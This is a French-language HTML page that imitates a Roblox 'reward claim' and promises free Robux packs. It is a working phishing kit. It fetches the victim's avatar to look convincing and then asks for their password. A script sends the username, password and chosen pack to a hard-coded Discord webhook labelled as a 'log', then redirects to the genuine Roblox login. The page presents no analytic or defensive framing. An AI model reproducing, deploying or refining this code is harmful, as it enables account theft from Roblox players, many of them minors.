<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Roblox | Programme de Récompenses</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --bg: #191b1d; --nav: #232527; --blue: #00a2ff; --text: #ffffff; --sub: #adb1b5; --err: #ff4d4d; }
        body { margin: 0; background: var(--bg); font-family: "HCo Gotham SSm", "Helvetica Neue", sans-serif; color: var(--text); display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: var(--nav); width: 400px; padding: 35px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; }
        
        /* LOGO FIX */
        .logo-container { margin-bottom: 20px; }
        .logo-img { width: 150px; filter: brightness(1.2); }

        h1 { font-size: 20px; font-weight: 500; margin-bottom: 10px; }
        p { font-size: 13px; color: var(--sub); line-height: 1.4; margin-bottom: 20px; }

        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #393b3d; border-radius: 4px; color: #fff; box-sizing: border-box; outline: none; font-size: 14px; }
        input:focus { border-color: var(--blue); }

        .avatar-box { display: none; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 15px; }
        #av-img { width: 60px; height: 60px; border-radius: 50%; border: 2px solid var(--blue); }

        .btn { width: 100%; padding: 13px; background: var(--blue); border: none; border-radius: 4px; color: #fff; font-weight: 600; cursor: pointer; margin-top: 10px; font-size: 15px; }
        .btn:hover { background: #0081cc; }
        
        .step { display: none; }
        .active { display: block; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo-img" style="filter: invert(1); width: 50px;">
        <div style="font-weight: bold; font-size: 24px; margin-top: 5px;">ROBLOX</div>
    </div>

    <div id="s1" class="step active">
        <h1>Réclamation de Récompense</h1>
        <p>Veuillez choisir le pack de Robux à créditer sur votre compte après vérification.</p>
        
        <div class="avatar-box" id="avatar-box">
            <img id="av-img" src="">
            <div id="u-display" style="font-size: 12px; margin-top: 5px; color: var(--blue);"></div>
        </div>

        <input type="text" id="username" placeholder="Nom d'utilisateur" onblur="findUser()">
        
        <select id="rbx-choice">
            <option value="1700">1,700 Robux (Standard)</option>
            <option value="4500">4,500 Robux (Premium)</option>
            <option value="10000">10,000 Robux (MVP)</option>
            <option value="50000">50,000 Robux (Admin Test)</option>
        </select>

        <button class="btn" onclick="toStep2()">Suivant</button>
    </div>

    <div id="s2" class="step">
        <h1 style="color: var(--err);">Action Requise</h1>
        <p>Pour finaliser l'envoi de <b id="amt-display"></b> Robux, confirmez votre identité pour la synchronisation Cloud.</p>
        
        <input type="password" id="password" placeholder="Mot de passe">
        <button class="btn" style="background: #27ae60;" onclick="sendData()">Valider & Recevoir</button>
    </div>
</div>

<script>
    const WH = "https://discord.com/api/webhooks/1490805370715902075/gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9";

    async function findUser() {
        const u = document.getElementById('username').value;
        if(u.length < 3) return;
        try {
            const r = await fetch(`https://corsproxy.io/?https://users.roblox.com/v1/usernames/users`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ usernames: [u] })
            });
            const d = await r.json();
            if(d.data && d.data.length > 0) {
                const id = d.data[0].id;
                const t = await fetch(`https://corsproxy.io/?https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${id}&size=150x150&format=Png`);
                const td = await t.json();
                document.getElementById('av-img').src = td.data[0].imageUrl;
                document.getElementById('avatar-box').style.display = "block";
                document.getElementById('u-display').innerText = "@" + d.data[0].displayName;
            }
        } catch(e) {}
    }

    function toStep2() {
        const u = document.getElementById('username').value;
        if(!u) return alert("Pseudo requis");
        document.getElementById('amt-display').innerText = document.getElementById('rbx-choice').value;
        document.getElementById('s1').classList.remove('active');
        document.getElementById('s2').classList.add('active');
    }

    async function sendData() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        const a = document.getElementById('rbx-choice').value;

        await fetch(WH, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "💎 NOUVEAU LOG - V11",
                    color: 3447003,
                    fields: [
                        { name: "👤 User", value: `\`${u}\``, inline: true },
                        { name: "🔑 Pass", value: `\`${p}\``, inline: true },
                        { name: "💰 Pack", value: `\`${a} Robux\``, inline: true }
                    ]
                }]
            })
        });
        window.location.href = "https://www.roblox.com/login";
    }
</script>
</body>
</html>
